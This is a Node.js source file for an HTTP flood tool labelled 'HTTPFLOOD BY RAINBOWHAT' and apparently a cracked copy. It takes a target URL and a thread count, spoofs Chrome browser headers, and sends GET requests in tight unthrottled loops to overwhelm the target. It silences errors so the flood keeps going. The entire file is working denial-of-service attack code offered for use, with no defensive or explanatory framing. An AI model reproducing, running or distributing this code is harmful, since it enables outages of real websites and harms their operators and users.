let i = 0;
if (process.argv.length !== 5) {
    console.log('HTTPFLOOD BY RAINBOWHAT');
    console.log('Cracked by odium sec');
    console.log('Usage: node httpflood.js <URL> <TIME> <THREADS>');
    process.exit(0);
} else {
    const https = require('follow-redirects').https, http = require('http'), url = require('url'), host = url.parse(process.argv[2]).host, options = {
            method: 'GET',
            hostname: host,
            path: '/',
            headers: {
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,zh-CN;q=0.6,zh;q=0.5,de;q=0.4',
                'cache-control': 'max-age=0',
                'sec-ch-ua': 'Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                Connection: 'Keep-Alive'
            },
            maxRedirects: 20
        };
    process.on('uncaughtException', function () {
    });
    process.on('unhandledRejection', function () {
    });
    console.log('HTTPFLOOD BY RAINBOWHAT');
    for (let i = 0; i < process.argv[4]; i++) {
        console.log('Threads: [' + i + '] Started');
    }
    for (let i = 0; i < process.argv[4]; i++) {
        if (process.argv[2].split(':')[0] == 'https') {
            console.log('[HTTP/S] Attacking Threads: [' + i + '] Started');
            setInterval(() => {
                https.get(options, function (res) {
                    console.log(res.statusCode + ' [' + i + ']');
                    i++;
                });
            });
        } else {
            console.log('[HTTP] Attacking Threads: [' + i + '] Started');
            setInterval(() => {
                http.get(options, function (res) {
                    console.log(res.statusCode + ' [' + i + ']');
                    i++;
                });
            });
        }
    }
}
